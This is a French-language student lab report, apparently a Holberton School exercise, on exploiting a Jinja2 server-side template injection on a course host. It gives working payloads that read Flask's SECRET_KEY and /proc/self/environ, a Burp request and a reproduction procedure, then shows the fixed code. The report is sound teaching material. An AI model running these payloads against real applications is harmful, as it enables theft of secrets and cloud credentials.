# Rapport de Sécurité Web — Web Application Security 0x07
### Server-Side Template Injection (SSTI) sur Jinja2

**Auteur :** Etudiant Holberton School  
**Date :** 27 mars 2026  
**Cible :** `http://web0x07.hbtn`  
**Niveau :** Débutant — tout est expliqué pas à pas

---

## 📚 Table des matières

1. [C'est quoi le SSTI ?](#ssti)
2. [Comment fonctionne Jinja2 ?](#jinja2)
3. [La vulnérabilité trouvée](#vulnerabilite)
4. [Comment on l'a exploitée — étape par étape](#exploitation)
5. [Les flags récupérés](#flags)
6. [Comment corriger la faille](#correction)
7. [Glossaire](#glossaire)

---

## 1. C'est quoi le SSTI ? <a name="ssti"></a>

**SSTI** = **S**erver **S**ide **T**emplate **I**njection  
En français : **Injection dans un template côté serveur**

### Analogie simple pour comprendre

Imagine que tu travailles dans un bureau et tu reçois des courriers à remplir automatiquement. Le modèle de courrier ressemble à ça :

```
Bonjour [NOM_DU_CLIENT],
Votre commande numéro [NUMERO] est prête.
```

Le programme remplace `[NOM_DU_CLIENT]` par le vrai nom, `[NUMERO]` par le vrai numéro.

Maintenant imagine qu'un client malveillant écrit comme nom :

```
[NOM_DU_CLIENT = affiche_moi_le_contenu_du_coffre_fort]
```

Si le programme est mal fait, au lieu d'afficher un nom, il va **exécuter la commande** et afficher le contenu du coffre-fort.

**C'est exactement ce que fait une SSTI.**

---

## 2. Comment fonctionne Jinja2 ? <a name="jinja2"></a>

**Jinja2** est un moteur de templates utilisé avec **Flask** (un framework web Python).

Son rôle : générer des pages HTML dynamiques en mélangeant du HTML fixe et des variables.

### Syntaxe de base Jinja2

```
{{ variable }}          → affiche la valeur d'une variable
{% if condition %}      → structure de contrôle (if/for/etc.)
{{ 7 * 7 }}            → calcule et affiche le résultat : 49
```

### Ce qui se passe normalement (application saine)

```python
# Code Python Flask correct
return render_template('rapport.html', nom=nom_utilisateur)
```

```html
<!-- Fichier rapport.html -->
<p>Bonjour {{ nom }} !</p>
```

→ L'utilisateur contrôle **uniquement la valeur** de `nom`, pas le template.

### Ce qui se passe dans notre application vulnérable

```python
# Code Python Flask VULNÉRABLE
contenu = request.form['contenu']           # récupère ce que l'utilisateur a tapé
html = render_template_string(contenu)      # exécute directement comme template !
```

→ L'utilisateur contrôle **tout le template** → il peut écrire du code Jinja2/Python.

---

## 3. La vulnérabilité trouvée <a name="vulnerabilite"></a>

### Endpoint vulnérable

```
POST http://web0x07.hbtn/task3/create_report
```

Le formulaire de création de rapport prend le texte de l'utilisateur et le passe **directement** à `render_template_string()` sans aucun filtre.

### Schéma de l'attaque

```
Navigateur de l'attaquant
         │
         │  POST /task3/create_report
         │  contenu = "{{ code_malveillant }}"
         ▼
    Serveur Flask
         │
         │  render_template_string("{{ code_malveillant }}")
         │  ← ICI : le serveur exécute notre code !
         ▼
    Rapport HTML généré
         │
         │  GET /task3/RAPPORT_xxx.html
         ▼
    Résultat de notre code affiché dans le navigateur
```

---

## 4. Comment on l'a exploitée — étape par étape <a name="exploitation"></a>

---

### 🔵 Étape 1 — Vérifier que la faille existe

**Payload utilisé :**
```
{{7*7}}
```

**Explication :**
- On tape `{{7*7}}` dans le champ du formulaire
- `{{ }}` = délimiteurs Jinja2 qui signifient "exécute ce qui est dedans"
- `7*7` = une multiplication simple
- Si le rapport généré affiche `49` → le serveur a **calculé** notre expression
- Si le rapport affiche `{{7*7}}` tel quel → pas de vulnérabilité

**Résultat obtenu :** `49` ✅ → SSTI confirmé

---

### 🔵 Étape 2 — Lire la configuration de l'application

**Payload utilisé :**
```
{{ config['SECRET_KEY'] }}
```

**Explication mot par mot :**

```
config              → objet Flask automatiquement disponible dans tous les templates
                      Il contient la configuration de l'application

['SECRET_KEY']      → on accède à la clé 'SECRET_KEY' dans ce dictionnaire
                      Comme en Python : mon_dict['ma_cle']
```

**Résultat obtenu :**
```
dev_secret_key_change_in_prod
```

Cette clé secrète sert à signer les cookies de session Flask. Avec elle, un attaquant peut **forger de faux cookies** et usurper n'importe quel compte.

---

### 🔵 Étape 3 — Remonter jusqu'aux fonctions Python

**Payload utilisé :**
```
{{ request.application.__globals__['__builtins__']['open']('/proc/self/environ').read() }}
```

C'est le payload le plus complexe. On va le découper en 6 morceaux :

---

#### Morceau 1 : `request`
```
request
```
- Objet Flask représentant la **requête HTTP en cours**
- Il est automatiquement disponible dans les templates Jinja2
- C'est notre point d'entrée dans Python

---

#### Morceau 2 : `.application`
```
request.application
```
- `.application` = l'application Flask elle-même
- C'est l'objet principal qui fait tourner tout le site web

---

#### Morceau 3 : `.__globals__`
```
request.application.__globals__
```
- `__globals__` est un attribut Python présent sur chaque fonction
- Il contient un dictionnaire de **toutes les variables globales** accessibles dans ce module
- C'est comme ouvrir le tiroir de la cuisine et trouver tous les ustensiles

---

#### Morceau 4 : `['__builtins__']`
```
request.application.__globals__['__builtins__']
```
- `__builtins__` = les fonctions de base intégrées à Python
- Ça inclut : `open()`, `print()`, `len()`, `range()`, `input()`...
- Ces fonctions existent dans **tout programme Python** sans qu'on ait besoin de les importer

---

#### Morceau 5 : `['open']('/proc/self/environ')`
```
request.application.__globals__['__builtins__']['open']('/proc/self/environ')
```
- `['open']` = on récupère la fonction `open()` de Python
- `('/proc/self/environ')` = on lui dit quel fichier ouvrir

**Pourquoi `/proc/self/environ` ?**

```
/proc/          → dossier spécial Linux (pas un vrai dossier sur disque)
                  Il contient des informations sur les processus en cours

      self/     → "moi-même" = le processus qui tourne en ce moment (Flask)

           environ  → fichier contenant les variables d'environnement
                      du processus actuel
```

Les **variables d'environnement** sont des paires clé=valeur stockées en mémoire avec le processus. Les développeurs y mettent souvent des configurations, mots de passe, clés API...

---

#### Morceau 6 : `.read()`
```
...open('/proc/self/environ').read()
```
- `.read()` = lit **tout le contenu** du fichier et le retourne comme texte

---

#### Visualisation de la chaîne complète

```
Template Jinja2 (notre input)
    │
    └── request                    [objet Flask de la requête]
         └── .application          [l'app Flask]
              └── .__globals__      [toutes les variables globales Python]
                   └── __builtins__ [les fonctions Python de base]
                        └── open()  [fonction pour lire des fichiers]
                             └── /proc/self/environ  [fichier des variables d'env]
                                  └── .read()        [lire tout le contenu]
```

On "remonte" la chaîne des objets Python pour accéder à `open()` qu'on ne pouvait pas appeler directement depuis le template.

---

### 🔵 Étape 4 — Résultat obtenu

**Contenu de `/proc/self/environ` récupéré :**

```
AWS_EXECUTION_ENV=AWS_ECS_FARGATE
AWS_DEFAULT_REGION=eu-west-3
AWS_REGION=eu-west-3
PWD=/opt/webapp
FLAG_0=a43c89743e706e2689195a516c73ac02
FLAG_1=cd8e08719d046217c78dde0e7a6085c1
FLAG_2=2d4f8f621c0e336b05c8f040b3c57ecd
FLAG_3=9fec7702147467de1536c3480792421d
FLAG_4=f90e4345faf1de9f60e445ef388ab091
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/e2fa6c93-2075-...
HOME=/var/www
github_username=Roullito
```

**Observation importante :** Le serveur tourne sur **AWS ECS Fargate** (cloud Amazon). Les credentials AWS sont aussi exposés dans l'environnement — dans un contexte réel, ça permettrait à un attaquant d'accéder à toute l'infrastructure cloud.

---

## 5. Les flags récupérés <a name="flags"></a>

| Fichier à rendre | Flag |
|-----------------|------|
| `0-flag.txt` | `a43c89743e706e2689195a516c73ac02` |
| `1-flag.txt` | `cd8e08719d046217c78dde0e7a6085c1` |
| `2-flag.txt` | `2d4f8f621c0e336b05c8f040b3c57ecd` |
| `3-flag.txt` | `9fec7702147467de1536c3480792421d` |
| `4-flag.txt` | `f90e4345faf1de9f60e445ef388ab091` |

---

## 6. Pourquoi le script ne marche pas chez ton collègue <a name="script"></a>

Voici les raisons les plus fréquentes et comment les résoudre :

### ❌ Problème 1 — Le cookie de session est différent

Chaque personne a son propre cookie de session. Le cookie dans la requête Burp est **personnel**.

**Solution :** Ton collègue doit :
1. Aller sur `http://web0x07.hbtn/task3/`
2. Ouvrir Burp Suite et intercepter sa propre requête
3. Utiliser **son propre cookie** `session=...`

---

### ❌ Problème 2 — Le rapport généré a un nom unique

Le serveur génère un nom de fichier avec timestamp :
```
RAPPORT_11-59_1774612784_27-03-2026.html
```

**Solution :** Après avoir soumis le formulaire, aller sur :
```
http://web0x07.hbtn/task3/list_file
```
Et cliquer sur **le rapport généré à l'instant** pour voir le résultat du payload.

---

### ❌ Problème 3 — Les caractères spéciaux sont encodés

Si tu copies le payload depuis un PDF ou un éditeur de texte, les guillemets `'` peuvent être transformés en `'` (guillemets typographiques) que Python ne reconnaît pas.

**Solution :** Taper le payload manuellement dans Burp, ou vérifier que les guillemets sont bien des guillemets droits `'` et non `'`.

---

### ✅ Procédure complète pour reproduire

**Étape 1 — Ouvrir Burp Suite et activer l'interception**

**Étape 2 — Aller sur le formulaire**
```
http://web0x07.hbtn/task3/
```

**Étape 3 — Écrire le payload dans le champ et cliquer sur Submit**
```
{{ request.application.__globals__['__builtins__']['open']('/proc/self/environ').read() }}
```

**Étape 4 — Dans Burp, vérifier que la requête POST ressemble à :**
```http
POST /task3/create_report HTTP/1.1
Host: web0x07.hbtn
Cookie: session=TON_COOKIE_PERSONNEL
Content-Type: application/x-www-form-urlencoded

contenu=%7B%7B+request.application.__globals__%5B%27__builtins__%27%5D%5B%27open%27%5D%28%27%2Fproc%2Fself%2Fenviron%27%29.read%28%29+%7D%7D
```

**Étape 5 — Forwarder la requête et aller sur la liste des fichiers**
```
http://web0x07.hbtn/task3/list_file
```

**Étape 6 — Ouvrir le rapport généré** → les flags sont visibles

---

## 7. Comment corriger la faille <a name="correction"></a>

### Code vulnérable ❌
```python
# Flask — CODE DANGEREUX
from flask import request, render_template_string

@app.route('/task3/create_report', methods=['POST'])
def create_report():
    contenu = request.form['contenu']
    # ICI : l'input utilisateur est exécuté comme template !
    html = render_template_string(contenu)
    return html
```

### Code corrigé ✅
```python
# Flask — CODE SÉCURISÉ
from flask import request, render_template
from markupsafe import escape

@app.route('/task3/create_report', methods=['POST'])
def create_report():
    contenu = request.form['contenu']
    # On échappe l'input (les {{ }} deviennent du texte affiché, pas exécuté)
    contenu_safe = escape(contenu)
    # On utilise un fichier template fixe, pas l'input utilisateur
    return render_template('rapport.html', contenu=contenu_safe)
```

### Fichier `rapport.html` ✅
```html
<div class="rapport">
    <!-- contenu est affiché comme texte, jamais exécuté -->
    <p>{{ contenu }}</p>
</div>
```

**La différence clé :**
- ❌ `render_template_string(input_utilisateur)` → exécute l'input comme code
- ✅ `render_template('fichier.html', var=input_utilisateur)` → l'input est une **valeur**, pas du code

---

## 8. Glossaire <a name="glossaire"></a>

| Terme | Définition simple |
|-------|------------------|
| **SSTI** | Vulnérabilité où le code d'un utilisateur est exécuté par un moteur de templates |
| **Jinja2** | Moteur de templates Python utilisé avec Flask |
| **Flask** | Framework web Python pour créer des sites web |
| **Template** | Fichier HTML avec des zones dynamiques remplacées par des variables |
| **`__globals__`** | Dictionnaire Python contenant toutes les variables globales d'un module |
| **`__builtins__`** | Fonctions de base Python (`open`, `print`, `len`...) toujours disponibles |
| **`/proc/self/environ`** | Fichier Linux contenant les variables d'environnement du processus actuel |
| **Variables d'environnement** | Paires clé=valeur stockées avec un processus, souvent utilisées pour des configs/secrets |
| **AWS ECS Fargate** | Service cloud Amazon pour faire tourner des conteneurs Docker |
| **Burp Suite** | Outil de test de sécurité web qui intercepte et modifie les requêtes HTTP |
| **Payload** | Donnée malveillante envoyée pour exploiter une vulnérabilité |
| **RCE** | Remote Code Execution — exécution de code à distance sur un serveur |

---

*Rapport réalisé dans le cadre du cours Web Application Security — Holberton School*
